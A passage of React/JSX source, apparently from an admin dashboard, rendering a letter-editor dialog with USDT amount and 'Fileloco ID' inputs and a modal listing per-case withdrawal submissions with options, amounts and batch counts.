                    <Input 
                      value={letterData.optionBTotalAmount || ""}
                      onChange={(e) => setLetterData({...letterData, optionBTotalAmount: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 75,000 USDT"
                      data-testid="input-option-b-total-amount"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Fileloco ID</Label>
                    <Input 
                      value={letterData.optionBFilelocoId || ""}
                      onChange={(e) => setLetterData({...letterData, optionBFilelocoId: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 11223344"
                      data-testid="input-option-b-fileloco"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>

          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsLetterEditorOpen(false)}>Cancel</Button>
            <Button onClick={handleSaveLetter} className="bg-blue-600 hover:bg-blue-700 text-white" data-testid="button-save-letter">
              Save Letter
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Submissions History Modal */}
      <Dialog open={isSubmissionsOpen} onOpenChange={setIsSubmissionsOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100 max-w-2xl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <History className="w-5 h-5" /> Submission History
            </DialogTitle>
            <DialogDescription className="text-slate-400">
              Previous submissions for {selectedCase?.userName || "this user"}.
            </DialogDescription>
          </DialogHeader>
          
          <div className="py-4">
            {caseSubmissions.length === 0 ? (
              <div className="text-center py-8 text-slate-500">
                No submissions yet for this case.
              </div>
            ) : (
              <div className="space-y-3">
                {caseSubmissions.map((s) => (
                  <div key={s.id} className="bg-slate-900 border border-slate-800 rounded-lg p-4" data-testid={`card-submission-${s.id}`}>
                    <div className="flex justify-between items-start mb-2">
                      <Badge className={s.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
                        Option {s.selectedOption}
                      </Badge>
                      <span className="text-xs text-slate-500">
                        {new Date(s.submittedAt).toLocaleString()}
                      </span>
                    </div>
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      <div>
                        <span className="text-slate-500">Amount:</span>{" "}
                        <span className="text-green-400">{s.withdrawalAmount}</span>
                      </div>
                      <div>
                        <span className="text-slate-500">Batches:</span>{" "}
                        <span className="text-slate-300">{s.withdrawalBatches}</span>
                      </div>
                    </div>
                    {s.notes && (
                      <div className="mt-2 text-xs text-slate-400">
                        Notes: {s.notes}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>

          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsSubmissionsOpen(false)}>Close</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
